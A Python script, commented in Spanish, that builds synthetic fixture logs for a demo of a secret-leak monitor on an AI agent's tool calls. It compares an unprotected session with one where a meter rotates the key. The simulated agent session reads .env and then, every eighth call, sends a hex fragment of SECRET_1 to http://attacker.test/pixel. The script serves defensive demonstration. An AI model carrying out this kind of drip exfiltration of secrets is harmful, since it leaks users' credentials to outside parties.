"""Genera los registros de la pantalla dividida (tarea 15b).

La misma sesión de goteo de 60 llamadas, pasada por dos funciones de decisión:
  split_left.jsonl   sin protección: todo allow, los bits de SECRET_1 suben y
                     el atacante usa la clave reconstruida -> 200
  split_right.jsonl  con el medidor: rota SECRET_1 cada vez que lo filtrado
                     llega al umbral (diente de sierra) -> el atacante recibe 401

Cada 8 llamadas sale un fragmento de 4 caracteres hex del secreto (16 bits)
hacia attacker.test. Datos sintéticos: no son resultados del detector.
Determinista (sin azar ni reloj).  Uso: python demo/viz/make_split_fixture.py
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))  # raíz del repo, para importar contracts

from contracts import Decision, Event, Leak, ToolCall  # noqa: E402

OUT_LEFT = HERE / "fixtures" / "split_left.jsonl"
OUT_RIGHT = HERE / "fixtures" / "split_right.jsonl"
SID = "sesion-goteo-1"
T0 = 1_763_710_000.0
N_CALLS = 60
EVERY = 8
FRAG_BITS = 16.0       # 4 caracteres hex
SECRET_BITS = 160.0    # 40 caracteres hex
ROTATE_AT = 32.0       # umbral del panel derecho: rota al llegar a 2 fragmentos
KEY_V1 = "SECRET_1(v1)"  # marcador, no el valor real

BENIGN = [
    ("read_file", lambda t: {"path": f"src/app/modulo_{t}.py"}, ["src/"]),
    ("list_dir", lambda t: {"path": "docs"}, ["docs/"]),
    ("git", lambda t: {"args": ["log", "-1"]}, ["src/"]),
]


def calls() -> list[ToolCall]:
    out = []
    frag = 0
    for t in range(1, N_CALLS + 1):
        if t == 3:
            out.append(ToolCall(id=f"c{t}", t=t, tool="read_file", args={"path": ".env"},
                                output="<contenido con secretos>", resources=[".env"], session_id=SID,
                                label="attack"))
        elif t % EVERY == 0:
            frag += 1
            out.append(ToolCall(id=f"c{t}", t=t, tool="http_request",
                                args={"method": "GET", "url": f"http://attacker.test/pixel?f={frag}&d=xxxx",
                                      "headers": {}, "body": ""},
                                output="", resources=["attacker.test"], is_sink=True, session_id=SID,
                                label="attack"))
        else:
            tool, args, res = BENIGN[t % len(BENIGN)]
            out.append(ToolCall(id=f"c{t}", t=t, tool=tool, args=args(t), output="ok", resources=res,
                                session_id=SID, label="benign"))
    return out


def leak(bits: float) -> dict:
    return {"SECRET_1": Leak(bits=bits, fraction=round(bits / SECRET_BITS, 4))} if bits > 0 else {}


def left_decisions(cs):
    bits, out = 0.0, []
    for c in cs:
        if c.is_sink:
            bits += FRAG_BITS
        out.append((Decision(action="allow", leak=leak(bits),
                             reason="sin protección: todo pasa" if not c.is_sink
                             else f"sin protección: salen {bits:.0f} bits de SECRET_1"), None))
    return out


def right_decisions(cs):
    bits, version, S, path, out = 0.0, 1, 0.0, [], []
    for c in cs:
        rot = None
        if c.tool == "read_file" and c.args.get("path") == ".env":
            path = [c.id]
        if c.is_sink:
            bits += FRAG_BITS
            S += 1.0
            path = path + [c.id]
            if bits >= ROTATE_AT:
                version += 1
                rot = {"secret_id": "SECRET_1", "version": version}
                d = Decision(action="rotate+allow", S=S, R_plus=0.6, leak=leak(bits), path=list(path),
                             reason=f"SECRET_1 llega a {bits:.0f} bits: se rota a v{version}; lo filtrado deja de servir")
            else:
                d = Decision(action="allow", S=S, R_plus=0.3, leak=leak(bits), path=list(path),
                             reason=f"sumidero con {bits:.0f} bits de SECRET_1, bajo el umbral de {ROTATE_AT:.0f}")
        else:
            d = Decision(action="allow", S=S, leak=leak(bits), reason="llamada benigna")
        out.append((d, rot))
        if rot:
            bits = 0.0  # la clave nueva no tiene nada filtrado
    return out


def events(cs, decisions, final_status: int) -> list[Event]:
    evs = []
    for c, (d, rot) in zip(cs, decisions):
        ts = T0 + c.t
        evs.append(Event(ts=ts, session_id=SID, source="proxy", kind="tool_call", call_id=c.id,
                         data=c.model_dump(mode="json")))
        evs.append(Event(ts=ts + 0.1, session_id=SID, source="proxy", kind="decision", call_id=c.id,
                         data=d.model_dump(mode="json")))
        if rot:
            evs.append(Event(ts=ts + 0.2, session_id=SID, source="proxy", kind="rotation", call_id=c.id,
                             data=rot))
    # El atacante usa lo que reconstruyó contra la API protegida.
    evs.append(Event(ts=T0 + N_CALLS + 1, session_id=SID, source="attacker", kind="received", call_id=None,
                     data={"method": "GET", "path": "/v1/data", "host": "api.empresa.test",
                           "status": final_status}))
    return evs


def write(path: Path, evs: list[Event]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        for e in evs:
            f.write(e.model_dump_json() + "\n")


def main() -> None:
    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", type=Path, default=OUT_LEFT.parent, help="por defecto fixtures/")
    out_dir = ap.parse_args().out_dir
    cs = calls()
    left, right = out_dir / OUT_LEFT.name, out_dir / OUT_RIGHT.name
    write(left, events(cs, left_decisions(cs), 200))
    write(right, events(cs, right_decisions(cs), 401))
    print(f"{left}\n{right}")


if __name__ == "__main__":
    main()
